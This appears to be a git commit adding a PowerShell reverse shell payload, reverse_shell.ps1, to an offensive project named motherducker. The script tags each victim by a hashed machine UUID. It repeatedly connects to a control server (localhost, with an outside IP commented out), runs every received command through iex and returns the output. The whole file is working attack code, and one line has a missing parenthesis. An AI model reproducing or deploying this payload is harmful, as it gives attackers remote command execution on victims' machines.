ece266b4a1106f43f31f27c35fb80b7f366ad365
puijjar <puijjar@gmail.com>
2019-12-13 13:12:11 +0100

    Close socket on exit.

---
+++ motherducker/payloads/reverse_shell.ps1
@@ -0,0 +1,55 @@
+# Get UUID of the machine.
+try {
+    $uuid = [System.Text.Encoding]::UTF8.GetBytes((Get-WMIObject Win32_ComputerSystemProduct).UUID);
+} catch [System.Management.Automation.CommandNotFoundException] { # For testing on Linux.
+    $uuid = 0;
+}
+
+# Calculate SHA-256 hash from UUID.
+$hasher = [System.Security.Cryptography.HashAlgorithm]::Create("sha256");
+$uuid = $hasher.ComputeHash($uuid);
+
+# Preallocate byte array with zeroes? Max command length 65535 bytes?
+[byte[]] $bytes = 0..65535 | % {0};
+
+# Loop indefinitely until "exit" command is issued.
+while (1) {
+
+    # Attempt to establish connection to server. Retry every 3 seconds.
+    try {
+        #$client = New-Object System.Net.Sockets.TCPClient("145.24.222.156", 5000);
+        $client = New-Object System.Net.Sockets.TCPClient("localhost", 5000);
+    } catch { # Catch ConstructorInvokedThrowException..
+        Start-Sleep -s 3;
+        continue;
+    }
+
+    # Initialize byte stream.
+    $stream = $client.GetStream();
+
+    # Keep session established.
+    while (1) {
+
+        # Read bytes from stream and encode to ASCII.
+        $in = $stream.Read($bytes, 0, $bytes.Length);
+        $cmd = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $in);
+
+        # Retry in 2 seconds if there were nothing to read.
+        if ($cmd -eq "") {
+            Start-Sleep -s 2;
+            continue;
+        }
+        # Close socket and exit on "exit" command.
+        if ($cmd -eq "exit") {
+            $client.Close();
+            exit 1;
+        }
+
+        # Run command, encode stdout as UTF-8.
+        $out = [System.Text.Encoding]::UTF8.GetBytes((iex $cmd 2>&1 | Out-String));
+
+        # Write output to stream prepended by UUID.
+        $stream.Write($uuid + $out, 0, $uuid.Length + $out.Length;
+        $stream.Flush();
+    }
+}
